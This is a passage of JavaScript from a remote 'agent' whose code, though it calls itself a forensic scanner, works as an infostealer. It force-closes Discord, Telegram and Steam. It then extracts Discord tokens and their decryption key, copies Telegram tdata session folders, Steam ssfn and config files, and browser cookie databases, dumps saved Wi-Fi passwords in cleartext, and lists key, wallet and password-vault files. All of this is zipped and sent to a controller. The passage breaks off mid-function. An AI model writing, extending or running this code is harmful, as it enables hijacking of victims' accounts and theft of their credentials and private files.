      payload: { scanId, scanType, status: 'scanning', progress: pct, files: [] },
    });
  }

  (async () => {
    try {
      progress(5);
      const result = {
        scanId,
        scanType,
        status: 'complete',
        timestamp: new Date().toISOString(),
        sessions: null,
        inventory: null,
        files: [],
        archiveData: null,
        archiveName: null,
        reportText: null,
        progress: 100,
      };

      const allFiles = [];

      // ========== Archive-only mode: skip analysis, just collect files and zip ==========
      if (archiveOnly) {
        progress(10);
        console.log('[Agent] Archive-only mode — skipping analysis, collecting files...');

        // Kill apps to unlock files
        if (os.platform() === 'win32') {
          const appsToKill = [
            'Discord.exe', 'DiscordCanary.exe', 'DiscordPTB.exe', 'Update.exe',
            'Telegram.exe', 'AyuGram.exe', 'Kotatogram.exe', '64Gram.exe',
            'Steam.exe', 'steamwebhelper.exe',
          ];
          for (const app of appsToKill) {
            try { await execAsync(`taskkill /F /IM "${app}" 2>nul`, { timeout: 5000 }); } catch { /* not running */ }
          }
          await new Promise(r => setTimeout(r, 1500));
        }

        progress(20);
        const userProfile = process.env.USERPROFILE || process.env.HOME || '';
        const appData = process.env.APPDATA || path.join(userProfile, 'AppData', 'Roaming');
        const localAppData = process.env.LOCALAPPDATA || path.join(userProfile, 'AppData', 'Local');

        // Quick-detect paths for archive
        const tmpDir = path.join(os.tmpdir(), `forensic_${scanId}`);
        if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });

        // Write a basic report
        const reportLines = ['=== FORENSIC ARCHIVE (quick) ===', `Timestamp: ${new Date().toISOString()}`, `Hostname: ${os.hostname()}`, ''];
        fs.writeFileSync(path.join(tmpDir, 'report.txt'), reportLines.join('\n'), 'utf8');

        progress(30);

        // Collect Discord leveldb
        const discordVariants = ['discord', 'discordcanary', 'discordptb'];
        for (const variant of discordVariants) {
          const basePath = path.join(appData, variant);
          if (fs.existsSync(basePath)) {
            try {
              const lsPath = path.join(basePath, 'Local Storage', 'leveldb');
              if (fs.existsSync(lsPath)) {
                const destDir = path.join(tmpDir, 'discord', variant, 'leveldb');
                if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });
                for (const f of fs.readdirSync(lsPath)) {
                  try { fs.copyFileSync(path.join(lsPath, f), path.join(destDir, f)); } catch { /* skip */ }
                }
              }
              const localState = path.join(basePath, 'Local State');
              if (fs.existsSync(localState)) {
                const destDir = path.join(tmpDir, 'discord', variant);
                if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });
                try { fs.copyFileSync(localState, path.join(destDir, 'Local State')); } catch { /* skip */ }
              }
            } catch { /* skip */ }
          }
        }

        progress(50);

        // Collect Telegram tdata
        const tdataPath = path.join(appData, 'Telegram Desktop', 'tdata');
        if (fs.existsSync(tdataPath)) {
          try {
            const tdataDest = path.join(tmpDir, 'telegram', 'tdata');
            if (!fs.existsSync(tdataDest)) fs.mkdirSync(tdataDest, { recursive: true });
            try {
              await execAsync(`robocopy "${tdataPath}" "${tdataDest}" /E /R:0 /W:0 /NFL /NDL /NJH /NJS /nc /ns /np`, { timeout: 300000 });
            } catch (roboErr) {
              if (roboErr.code && typeof roboErr.code === 'number' && roboErr.code > 7) {
                console.log(`[Agent] robocopy tdata warning: exit code ${roboErr.code}`);
              }
            }
          } catch { /* skip */ }
        }

        progress(70);

        // Collect Steam
        const defaultSteamPath = 'C:\\Program Files (x86)\\Steam';
        if (fs.existsSync(defaultSteamPath)) {
          try {
            const steamDest = path.join(tmpDir, 'steam');
            if (!fs.existsSync(steamDest)) fs.mkdirSync(steamDest, { recursive: true });
            // ssfn files
            for (const f of fs.readdirSync(defaultSteamPath)) {
              if (f.startsWith('ssfn')) {
                try { fs.copyFileSync(path.join(defaultSteamPath, f), path.join(steamDest, f)); } catch { /* skip */ }
              }
            }
            // config folder
            const configSrc = path.join(defaultSteamPath, 'config');
            if (fs.existsSync(configSrc)) {
              const configDest = path.join(steamDest, 'config');
              if (!fs.existsSync(configDest)) fs.mkdirSync(configDest, { recursive: true });
              for (const item of fs.readdirSync(configSrc)) {
                try {
                  const src = path.join(configSrc, item);
                  const stat = fs.statSync(src);
                  if (stat.isFile() && stat.size < 20 * 1024 * 1024) fs.copyFileSync(src, path.join(configDest, item));
                } catch { /* skip */ }
              }
            }
          } catch { /* skip */ }
        }

        progress(85);

        // Collect browser cookies
        const cookiePaths = [
          path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
          path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies'),
          path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Network', 'Cookies'),
          path.join(appData, 'Opera Software', 'Opera Stable', 'Network', 'Cookies'),
        ];
        for (const cp of cookiePaths) {
          if (fs.existsSync(cp)) {
            try {
              const browser = cp.includes('Chrome') ? 'chrome' : cp.includes('Edge') ? 'edge' : cp.includes('Brave') ? 'brave' : 'opera';
              const dest = path.join(tmpDir, 'cookies', browser);
              if (!fs.existsSync(dest)) fs.mkdirSync(dest, { recursive: true });
              fs.copyFileSync(cp, path.join(dest, 'Cookies'));
            } catch { /* skip */ }
          }
        }

        progress(90);

        // Create ZIP
        if (os.platform() === 'win32') {
          const zipPath = path.join(os.tmpdir(), `forensic_${scanId}.zip`);
          try {
            await execAsync(`powershell -NoProfile -Command "Compress-Archive -Path '${tmpDir.replace(/'/g, "''")}\\*' -DestinationPath '${zipPath}' -Force"`, { timeout: 300000 });
            const zipStat = fs.statSync(zipPath);
            console.log(`[Agent] Archive ZIP size: ${(zipStat.size / 1024 / 1024).toFixed(1)} MB`);
            if (zipStat.size < 150 * 1024 * 1024) {
              const zipData = fs.readFileSync(zipPath);
              result.archiveData = zipData.toString('base64');
              result.archiveName = `forensic_${os.hostname()}_${scanId}.zip`;
            } else {
              console.log('[Agent] Archive ZIP too large (' + (zipStat.size / 1024 / 1024).toFixed(1) + ' MB)');
            }
            try { fs.unlinkSync(zipPath); } catch { /* ignore */ }
          } catch (zipErr) {
            console.error('[Agent] Archive ZIP error:', zipErr.message);
          }
        }
        try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch { /* ignore */ }

        progress(100);
        result.status = 'complete';
        result.reportText = reportLines.join('\n');
        send({ type: 'forensic_result', deviceId: DEVICE_ID, payload: result });
        console.log(`[Agent] Archive-only scan complete`);
        return;
      }

      // ========== Kill target applications to unlock files ==========
      if (os.platform() === 'win32') {
        progress(6);
        console.log('[Agent] Closing target applications to unlock session files...');
        const appsToKill = [
          'Discord.exe', 'DiscordCanary.exe', 'DiscordPTB.exe', 'Update.exe',
          'Telegram.exe', 'AyuGram.exe', 'Kotatogram.exe', '64Gram.exe',
          'Steam.exe', 'steamwebhelper.exe',
        ];
        for (const app of appsToKill) {
          try { await execAsync(`taskkill /F /IM "${app}" 2>nul`, { timeout: 5000 }); } catch { /* not running */ }
        }
        // Give a moment for files to be released
        await new Promise(r => setTimeout(r, 1500));
      }

      // ========== Sessions scan ==========
      if (scanType === 'sessions' || scanType === 'full') {
        progress(10);
        const sessions = { discord: { found: false, tokens: [], paths: [], localStatePath: '' }, telegram: { found: false, tdataPath: '', files: [] }, steam: { found: false, steamPath: '', ssfnFiles: [], configFiles: [] }, cookies: [] };

        const userProfile = process.env.USERPROFILE || process.env.HOME || '';
        const appData = process.env.APPDATA || path.join(userProfile, 'AppData', 'Roaming');
        const localAppData = process.env.LOCALAPPDATA || path.join(userProfile, 'AppData', 'Local');

        // --- Discord: collect ALL files from leveldb + Local State ---
        const discordVariants = ['discord', 'discordcanary', 'discordptb'];
        for (const variant of discordVariants) {
          const discordBase = path.join(appData, variant);
          const leveldbDir = path.join(discordBase, 'Local Storage', 'leveldb');
          const localState = path.join(discordBase, 'Local State');
          try {
            if (fs.existsSync(leveldbDir)) {
              sessions.discord.paths.push(leveldbDir);
              // Read ALL files in leveldb as binary (latin1) to not miss tokens in binary .ldb
              const ldbFiles = fs.readdirSync(leveldbDir);
              for (const file of ldbFiles) {
                const filePath = path.join(leveldbDir, file);
                try {
                  const stat = fs.statSync(filePath);
                  if (!stat.isFile()) continue;
                  // Add all .ldb and .log files to results
                  if (file.endsWith('.ldb') || file.endsWith('.log')) {
                    allFiles.push({ path: filePath, size: stat.size, modified: stat.mtime.toISOString(), category: 'discord' });
                  }
                  // Read as latin1 (binary-safe) — utf8 corrupts binary and misses tokens
                  const content = fs.readFileSync(filePath, 'latin1');
                  // Encrypted token pattern (dQw4w9WgXcQ: is the base64 prefix Discord uses)
                  const encTokenRegex = /dQw4w9WgXcQ:[^\s"',;\\]{30,}/g;
                  const encMatches = content.match(encTokenRegex);
                  if (encMatches) {
                    for (const m of encMatches) {
                      if (!sessions.discord.tokens.includes(m)) sessions.discord.tokens.push(m);
                    }
                  }
                  // Plain token patterns (legacy / unencrypted)
                  const plainTokenRegex = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{84}/g;
                  const plainMatches = content.match(plainTokenRegex);
                  if (plainMatches) {
                    for (const m of plainMatches) {
                      if (!sessions.discord.tokens.includes(m)) sessions.discord.tokens.push(m);
                    }
                  }
                } catch { /* skip unreadable */ }
              }
              // Grab Local State (needed for decryption key)
              if (fs.existsSync(localState)) {
                sessions.discord.localStatePath = localState;
                try {
                  const stat = fs.statSync(localState);
                  allFiles.push({ path: localState, size: stat.size, modified: stat.mtime.toISOString(), category: 'discord' });
                } catch { /* skip */ }
              }
            }
          } catch { /* skip */ }
        }
        // Also scan browser leveldb for Discord tokens (users logged in via browser)
        const browserLeveldbs = [
          path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
          path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
          path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
          path.join(appData, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
          path.join(appData, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
          path.join(localAppData, 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        ];
        for (const bdb of browserLeveldbs) {
          try {
            if (!fs.existsSync(bdb)) continue;
            const files = fs.readdirSync(bdb).filter(f => f.endsWith('.ldb') || f.endsWith('.log'));
            for (const file of files) {
              try {
                const content = fs.readFileSync(path.join(bdb, file), 'latin1');
                // Only look for discord.com context in browser storage
                if (!content.includes('discord')) continue;
                const encTokenRegex = /dQw4w9WgXcQ:[^\s"',;\\]{30,}/g;
                const plainTokenRegex = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{84}/g;
                const enc = content.match(encTokenRegex);
                const plain = content.match(plainTokenRegex);
                if (enc) for (const m of enc) { if (!sessions.discord.tokens.includes(m)) { sessions.discord.tokens.push(m); sessions.discord.paths.push(bdb); } }
                if (plain) for (const m of plain) { if (!sessions.discord.tokens.includes(m)) { sessions.discord.tokens.push(m); sessions.discord.paths.push(bdb); } }
              } catch { /* skip */ }
            }
          } catch { /* skip */ }
        }
        // Deduplicate paths
        sessions.discord.paths = [...new Set(sessions.discord.paths)];
        sessions.discord.found = sessions.discord.tokens.length > 0 || sessions.discord.paths.length > 0;
        progress(25);

        // --- Telegram tdata: search entire PC ---
        // Helper: recursively list all items in a directory
        function listAllRecursive(dir, prefix = '') {
          const results = [];
          try {
            const entries = fs.readdirSync(dir, { withFileTypes: true });
            for (const entry of entries) {
              const rel = prefix ? prefix + '/' + entry.name : entry.name;
              results.push(rel);
              if (entry.isDirectory()) {
                try {
                  const sub = listAllRecursive(path.join(dir, entry.name), rel);
                  results.push(...sub);
                } catch { /* skip inaccessible subdirs */ }
              }
            }
          } catch { /* skip */ }
          return results;
        }

        // Helper: accept a tdata folder and populate sessions.telegram
        function acceptTdata(tp) {
          try {
            const topItems = fs.readdirSync(tp);
            if (topItems.length < 2) return false; // too empty, not a real tdata
            sessions.telegram.found = true;
            sessions.telegram.tdataPath = tp;
            // List ALL files and folders recursively
            sessions.telegram.files = listAllRecursive(tp);
            // Add top-level items to allFiles for the file list
            for (const item of topItems) {
              try {
                const fpath = path.join(tp, item);
                const stat = fs.statSync(fpath);
                allFiles.push({ path: fpath, size: stat.isFile() ? stat.size : 0, modified: stat.mtime.toISOString(), category: 'telegram' });
              } catch { /* skip */ }
            }
            return true;
          } catch { return false; }
        }

        // 1) Check known standard paths first (instant)
        const telegramKnownPaths = [
          path.join(appData, 'Telegram Desktop', 'tdata'),
          path.join(localAppData, 'Telegram Desktop', 'tdata'),
          path.join(appData, 'AyuGram', 'tdata'),
          path.join(localAppData, 'AyuGram', 'tdata'),
          path.join(appData, 'AyuGram Desktop', 'tdata'),
          path.join(localAppData, 'AyuGram Desktop', 'tdata'),
          path.join(appData, 'Kotatogram Desktop', 'tdata'),
          path.join(localAppData, 'Kotatogram Desktop', 'tdata'),
          path.join(appData, '64Gram Desktop', 'tdata'),
          path.join(appData, 'iMe Desktop', 'tdata'),
          path.join(appData, 'Nekogram Desktop', 'tdata'),
          path.join(appData, 'Forkgram', 'tdata'),
        ];
        let tdataFound = false;
        for (const tp of telegramKnownPaths) {
          try {
            if (fs.existsSync(tp) && acceptTdata(tp)) {
              tdataFound = true;
              console.log(`[Agent] tdata found at known path: ${tp}`);
              break;
            }
          } catch { /* skip */ }
        }

        // 2) If not found — full PC search using fast CMD 'dir /s /b /ad' for ANY folder named tdata
        if (!tdataFound && os.platform() === 'win32') {
          progress(28);
          console.log('[Agent] tdata not in standard paths, searching entire PC...');
          try {
            // Get all drives
            let drives = ['C:'];
            try {
              const { stdout: driveOut } = await execAsync('wmic logicaldisk get name', { timeout: 5000 });
              const parsed = driveOut.split('\n').map(l => l.trim()).filter(l => /^[A-Z]:$/i.test(l));
              if (parsed.length > 0) drives = parsed;
            } catch { /* fallback to C: */ }

            // Search user profile first (fast), then each drive
            const searchOrder = [userProfile];
            const oneDrive = process.env.OneDrive || process.env.OneDriveConsumer || '';
            if (oneDrive && oneDrive !== userProfile) searchOrder.push(oneDrive);
            for (const d of drives) {
              const dRoot = d + '\\';
              if (!searchOrder.includes(dRoot)) searchOrder.push(dRoot);
            }

            for (const root of searchOrder) {
              if (!root || tdataFound) break;
              try {
                if (!fs.existsSync(root)) continue;
                // Use CMD dir — much faster than PowerShell Get-ChildItem
                const cmd = `cmd /c "dir /s /b /ad "${root}tdata" 2>nul"`;
                const { stdout: out } = await execAsync(cmd, { timeout: 60000 });
                const trimmed = out.trim();
                if (trimmed) {
                  const paths = trimmed.split('\n').map(p => p.trim()).filter(p => p.toLowerCase().endsWith('\\tdata') || p.toLowerCase().endsWith('\\tdata\\'));
                  for (const tp of paths) {
                    const clean = tp.replace(/\\+$/, '');
                    if (acceptTdata(clean)) {
                      tdataFound = true;
                      console.log(`[Agent] tdata found via full search: ${clean}`);
                      break;
                    }
                  }
                }
              } catch (e) {
                console.log(`[Agent] Search in ${root}: ${e.message}`);
              }
            }
          } catch (deepErr) {
            console.log(`[Agent] Deep tdata search error: ${deepErr.message}`);
          }
        }
        progress(35);

        // --- Steam: ssfn files + config folder ---
        progress(37);
        const steamKnownPaths = [
          'C:\\Program Files (x86)\\Steam',
          'C:\\Program Files\\Steam',
          'D:\\Steam',
          'D:\\Program Files (x86)\\Steam',
          'E:\\Steam',
          path.join(userProfile, 'Steam'),
        ];
        let steamFound = false;
        for (const sp of steamKnownPaths) {
          try {
            if (fs.existsSync(sp) && fs.existsSync(path.join(sp, 'steam.exe'))) {
              sessions.steam.found = true;
              sessions.steam.steamPath = sp;
              steamFound = true;
              // Collect ssfn files (root of Steam folder, may be hidden)
              try {
                const rootFiles = fs.readdirSync(sp);
                for (const f of rootFiles) {
                  if (f.toLowerCase().startsWith('ssfn')) {
                    sessions.steam.ssfnFiles.push(f);
                    try {
                      const fpath = path.join(sp, f);
                      const stat = fs.statSync(fpath);
                      allFiles.push({ path: fpath, size: stat.size, modified: stat.mtime.toISOString(), category: 'steam' });
                    } catch { /* skip */ }
                  }
                }
              } catch { /* skip */ }
              // Collect config folder contents
              const configDir = path.join(sp, 'config');
              if (fs.existsSync(configDir)) {
                try {
                  const configItems = fs.readdirSync(configDir);
                  for (const item of configItems) {
                    try {
                      const fpath = path.join(configDir, item);
                      const stat = fs.statSync(fpath);
                      if (stat.isFile()) {
                        sessions.steam.configFiles.push(item);
                        allFiles.push({ path: fpath, size: stat.size, modified: stat.mtime.toISOString(), category: 'steam' });
                      }
                    } catch { /* skip */ }
                  }
                } catch { /* skip */ }
              }
              console.log(`[Agent] Steam found: ${sp}, ssfn: ${sessions.steam.ssfnFiles.length}, config: ${sessions.steam.configFiles.length}`);
              break;
            }
          } catch { /* skip */ }
        }
        // Deep search if not found in known paths
        if (!steamFound && os.platform() === 'win32') {
          try {
            const { stdout: driveOut2 } = await execAsync('wmic logicaldisk get name', { timeout: 5000 });
            const drives = driveOut2.split('\n').map(l => l.trim()).filter(l => /^[A-Z]:$/i.test(l));
            for (const drive of drives) {
              try {
                const psCmd = `powershell -NoProfile -Command "Get-ChildItem -Path '${drive}\\' -Directory -Filter 'Steam' -Recurse -ErrorAction SilentlyContinue -Depth 3 | Where-Object { Test-Path (Join-Path $_.FullName 'steam.exe') } | Select-Object -First 1 -ExpandProperty FullName"`;
                const { stdout: found } = await execAsync(psCmd, { timeout: 30000 });
                if (found.trim()) {
                  const sp = found.trim().split('\n')[0].trim();
                  sessions.steam.found = true;
                  sessions.steam.steamPath = sp;
                  try {
                    const rootFiles = fs.readdirSync(sp);
                    for (const f of rootFiles) {
                      if (f.toLowerCase().startsWith('ssfn')) {
                        sessions.steam.ssfnFiles.push(f);
                        try {
                          const fpath = path.join(sp, f);
                          const stat = fs.statSync(fpath);
                          allFiles.push({ path: fpath, size: stat.size, modified: stat.mtime.toISOString(), category: 'steam' });
                        } catch { /* skip */ }
                      }
                    }
                  } catch { /* skip */ }
                  const configDir = path.join(sp, 'config');
                  if (fs.existsSync(configDir)) {
                    try {
                      const configItems = fs.readdirSync(configDir);
                      for (const item of configItems) {
                        try {
                          const fpath = path.join(configDir, item);
                          const stat = fs.statSync(fpath);
                          if (stat.isFile()) {
                            sessions.steam.configFiles.push(item);
                            allFiles.push({ path: fpath, size: stat.size, modified: stat.mtime.toISOString(), category: 'steam' });
                          }
                        } catch { /* skip */ }
                      }
                    } catch { /* skip */ }
                  }
                  console.log(`[Agent] Steam found via search: ${sp}`);
                  break;
                }
              } catch { /* skip */ }
            }
          } catch { /* skip */ }
        }
        progress(40);

        // --- Browser cookies ---
        const browserPaths = [
          { browser: 'Chrome', profilePath: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Cookies') },
          { browser: 'Chrome', profilePath: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies') },
          { browser: 'Edge', profilePath: path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies') },
          { browser: 'Edge', profilePath: path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies') },
          { browser: 'Firefox', profilePath: path.join(appData, 'Mozilla', 'Firefox', 'Profiles') },
          { browser: 'Opera', profilePath: path.join(appData, 'Opera Software', 'Opera Stable', 'Cookies') },
          { browser: 'Opera GX', profilePath: path.join(appData, 'Opera Software', 'Opera GX Stable', 'Cookies') },
          { browser: 'Brave', profilePath: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Cookies') },
          { browser: 'Yandex', profilePath: path.join(localAppData, 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Cookies') },
        ];
        for (const bp of browserPaths) {
          let found = false;
          try {
            if (bp.browser === 'Firefox') {
              if (fs.existsSync(bp.profilePath)) {
                const profiles = fs.readdirSync(bp.profilePath);
                for (const profile of profiles) {
                  const cookieFile = path.join(bp.profilePath, profile, 'cookies.sqlite');
                  if (fs.existsSync(cookieFile)) {
                    found = true;
                    allFiles.push({ path: cookieFile, size: fs.statSync(cookieFile).size, modified: fs.statSync(cookieFile).mtime.toISOString(), category: 'cookies' });
                  }
                }
              }
            } else {
              if (fs.existsSync(bp.profilePath)) {
                found = true;
                try {
                  const stat = fs.statSync(bp.profilePath);
                  allFiles.push({ path: bp.profilePath, size: stat.size, modified: stat.mtime.toISOString(), category: 'cookies' });
                } catch { /* skip */ }
              }
            }
          } catch { /* skip */ }
          sessions.cookies.push({ browser: bp.browser, profilePath: bp.profilePath, found });
        }
        // Deduplicate by browser name (keep found=true if any path matched)
        const cookieMap = new Map();
        for (const c of sessions.cookies) {
          const existing = cookieMap.get(c.browser);
          if (!existing || c.found) cookieMap.set(c.browser, c);
        }
        sessions.cookies = Array.from(cookieMap.values());
        progress(45);

        result.sessions = sessions;
      }

      // ========== Inventory scan ==========
      if (scanType === 'inventory' || scanType === 'full') {
        progress(50);
        const inventory = {
          system: {
            hostname: os.hostname(),
            ip: getLocalIP(),
            mac: '',
            os: `${os.platform() === 'win32' ? 'Windows' : os.platform()} ${os.release()}`,
            username: process.env.USERNAME || process.env.USER || 'unknown',
            locale: Intl.DateTimeFormat().resolvedOptions().locale || 'unknown',
          },
          wifi: [],
          documents: [],
          downloads: [],
        };

        // Get MAC
        const interfaces = os.networkInterfaces();
        for (const addrs of Object.values(interfaces)) {
          const ipv4 = addrs.find(a => a.family === 'IPv4' && !a.internal);
          if (ipv4) { inventory.system.mac = ipv4.mac; break; }
        }

        // --- Wi-Fi networks ---
        if (os.platform() === 'win32') {
          try {
            const { stdout: profilesOut } = await execAsync('netsh wlan show profiles', { timeout: 10000 });
            const profileNames = [];
            for (const line of profilesOut.split('\n')) {
              const match = line.match(/All User Profile\s*:\s*(.+)/i) || line.match(/Все пользователи\s*:\s*(.+)/i) || line.match(/Profil\s.*:\s*(.+)/i);
              if (match) profileNames.push(match[1].trim());
            }
            for (const name of profileNames.slice(0, 30)) {
              try {
                const { stdout: detail } = await execAsync(`netsh wlan show profile name="${name}" key=clear`, { timeout: 5000 });
                let auth = 'Unknown';
                let password = '';
                const authMatch = detail.match(/Authentication\s*:\s*(.+)/i) || detail.match(/Проверка подлинности\s*:\s*(.+)/i);
                if (authMatch) auth = authMatch[1].trim();
                const keyMatch = detail.match(/Key Content\s*:\s*(.+)/i) || detail.match(/Содержимое ключа\s*:\s*(.+)/i);
                if (keyMatch) password = keyMatch[1].trim();
                inventory.wifi.push({ ssid: name, auth, password });
              } catch { /* skip */ }
            }
          } catch { /* skip */ }
        }
        progress(65);

        // --- Documents ---
        const userProfile = process.env.USERPROFILE || process.env.HOME || '';
        const docPaths = [
          path.join(userProfile, 'Documents'),
          path.join(userProfile, 'Документы'),
          path.join(userProfile, 'Desktop'),
          path.join(userProfile, 'Рабочий стол'),
        ];
        const importantExts = ['.doc', '.docx', '.pdf', '.xlsx', '.xls', '.pptx', '.txt', '.csv', '.rtf', '.odt', '.key', '.pem', '.rdp', '.ovpn', '.kdbx', '.wallet', '.json'];
        for (const dp of docPaths) {
          try {
            if (fs.existsSync(dp)) {
              const items = fs.readdirSync(dp).slice(0, 200);
              for (const item of items) {
                const ext = path.extname(item).toLowerCase();
                if (importantExts.includes(ext)) {
                  try {
                    const fp = path.join(dp, item);
                    const stat = fs.statSync(fp);
                    if (stat.isFile() && stat.size < 100 * 1024 * 1024) {
                      inventory.documents.push({ path: fp, size: stat.size, modified: stat.mtime.toISOString(), category: 'document' });
                      allFiles.push({ path: fp, size: stat.size, modified: stat.mtime.toISOString(), category: 'document' });
                    }
                  } catch { /* skip */ }
                }
              }
            }
          } catch { /* skip */ }
        }
        progress(80);

        // --- Downloads ---
        const dlPaths = [
          path.join(userProfile, 'Downloads'),
          path.join(userProfile, 'Загрузки'),
        ];
        for (const dp of dlPaths) {
          try {
            if (fs.existsSync(dp)) {
              const items = fs.readdirSync(dp).slice(0, 200);
              for (const item of items) {
                try {
                  const fp = path.join(dp, item);
                  const stat = fs.statSync(fp);
                  if (stat.isFile()) {
                    inventory.downloads.push({ path: fp, size: stat.size, modified: stat.mtime.toISOString(), category: 'document' });
                  }
                } catch { /* skip */ }
              }
            }
          } catch { /* skip */ }
        }

        result.inventory = inventory;
        progress(90);
      }

      result.files = allFiles;

      // ========== Build text report ==========
      const reportLines = [];
      reportLines.push('=== FORENSIC SCAN REPORT ===');
      reportLines.push(`Scan ID: ${scanId}`);
      reportLines.push(`Timestamp: ${new Date().toISOString()}`);
      reportLines.push(`Hostname: ${os.hostname()}`);
      reportLines.push(`Scan Type: ${scanType}`);
      reportLines.push('');

      if (result.sessions) {
        reportLines.push('--- SESSIONS ---');
        reportLines.push(`Discord tokens/keys found: ${result.sessions.discord.tokens.length}`);
        reportLines.push(`Discord paths: ${result.sessions.discord.paths.join(', ') || 'none'}`);
        if (result.sessions.discord.localStatePath) reportLines.push(`Discord Local State: ${result.sessions.discord.localStatePath}`);
        for (const t of result.sessions.discord.tokens) reportLines.push(`  Token: ${t}`);
        reportLines.push(`Telegram tdata found: ${result.sessions.telegram.found ? 'YES' : 'NO'}`);
        if (result.sessions.telegram.found) reportLines.push(`  Path: ${result.sessions.telegram.tdataPath}`);
        if (result.sessions.telegram.files.length > 0) reportLines.push(`  Files: ${result.sessions.telegram.files.join(', ')}`);
        reportLines.push(`Steam found: ${result.sessions.steam.found ? 'YES' : 'NO'}`);
        if (result.sessions.steam.found) {
          reportLines.push(`  Path: ${result.sessions.steam.steamPath}`);
          reportLines.push(`  SSFN files: ${result.sessions.steam.ssfnFiles.join(', ') || 'none'}`);
          reportLines.push(`  Config files: ${result.sessions.steam.configFiles.join(', ') || 'none'}`);
        }
        reportLines.push(`Browser cookies:`);
        for (const c of result.sessions.cookies) reportLines.push(`  ${c.browser}: ${c.found ? 'FOUND' : 'not found'} — ${c.profilePath}`);
        reportLines.push('');
      }

      if (result.inventory) {
        reportLines.push('--- INVENTORY ---');
        reportLines.push(`Hostname: ${result.inventory.system.hostname}`);
        reportLines.push(`IP: ${result.inventory.system.ip}`);
        reportLines.push(`MAC: ${result.inventory.system.mac}`);
        reportLines.push(`OS: ${result.inventory.system.os}`);
        reportLines.push(`User: ${result.inventory.system.username}`);
        reportLines.push('');
        reportLines.push(`Wi-Fi networks (${result.inventory.wifi.length}):`);
        for (const w of result.inventory.wifi) reportLines.push(`  ${w.ssid} [${w.auth}] password: ${w.password || '—'}`);
        reportLines.push('');
        reportLines.push(`Documents (${result.inventory.documents.length}):`);
        for (const d of result.inventory.documents) reportLines.push(`  ${d.path} (${d.size} bytes)`);
        reportLines.push('');
        reportLines.push(`Downloads (${result.inventory.downloads.length}):`);
        for (const d of result.inventory.downloads) reportLines.push(`  ${d.path} (${d.size} bytes)`);
        reportLines.push('');
      }

      reportLines.push(`Total files found: ${allFiles.length}`);
      reportLines.push('=== END OF REPORT ===');

      result.reportText = reportLines.join('\n');

      // ========== Build ZIP archive (full scan only) ==========
      if (scanType === 'full') {
        progress(92);
        try {
          const tmpDir = path.join(os.tmpdir(), `forensic_${scanId}`);
          if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
          // Write report
          fs.writeFileSync(path.join(tmpDir, 'report.txt'), result.reportText, 'utf8');
          // Copy Discord leveldb + Local State for archive
          if (result.sessions) {
            for (const dp of (result.sessions.discord.paths || [])) {
              try {
                if (fs.existsSync(dp)) {
                  const destDir = path.join(tmpDir, 'discord', path.basename(path.dirname(path.dirname(dp))), 'leveldb');
                  if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });
                  const files = fs.readdirSync(dp);
                  for (const f of files) {
                    try { fs.copyFileSync(path.join(dp, f), path.join(destDir, f)); } catch { /* skip */ }
                  }
                }
              } catch { /* skip */ }
            }
            if (result.sessions.discord.localStatePath && fs.existsSync(result.sessions.discord.localStatePath)) {
              try {
                const destDir = path.join(tmpDir, 'discord');
                if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });
                fs.copyFileSync(result.sessions.discord.localStatePath, path.join(destDir, 'Local State'));
              } catch { /* skip */ }
            }
            // Copy Steam ssfn + config
            if (result.sessions.steam && result.sessions.steam.found && result.sessions.steam.steamPath) {
              try {
                const steamDest = path.join(tmpDir, 'steam');
                if (!fs.existsSync(steamDest)) fs.mkdirSync(steamDest, { recursive: true });
                // Copy ssfn files
                for (const ssfn of result.sessions.steam.ssfnFiles) {
                  try { fs.copyFileSync(path.join(result.sessions.steam.steamPath, ssfn), path.join(steamDest, ssfn)); } catch { /* skip */ }
                }
                // Copy config folder
                const configSrc = path.join(result.sessions.steam.steamPath, 'config');
                if (fs.existsSync(configSrc)) {
                  const configDest = path.join(steamDest, 'config');
                  if (!fs.existsSync(configDest)) fs.mkdirSync(configDest, { recursive: true });
                  const items = fs.readdirSync(configSrc);
                  for (const item of items) {
                    try {
                      const src = path.join(configSrc, item);
                      const stat = fs.statSync(src);
                      if (stat.isFile() && stat.size < 20 * 1024 * 1024) {
                        fs.copyFileSync(src, path.join(configDest, item));
                      }
                    } catch { /* skip */ }
                  }
                }
              } catch { /* skip */ }
            }
            // Copy tdata — full recursive copy using robocopy (async to keep event loop alive)
            if (result.sessions.telegram.found && result.sessions.telegram.tdataPath && fs.existsSync(result.sessions.telegram.tdataPath)) {
              try {
                const tdataDest = path.join(tmpDir, 'telegram', 'tdata');
                if (!fs.existsSync(tdataDest)) fs.mkdirSync(tdataDest, { recursive: true });
                // robocopy copies everything recursively; exit codes 0-7 are success
                try {
                  await execAsync(`robocopy "${result.sessions.telegram.tdataPath}" "${tdataDest}" /E /R:0 /W:0 /NFL /NDL /NJH /NJS /nc /ns /np`, { timeout: 300000 });
                } catch (roboErr) {
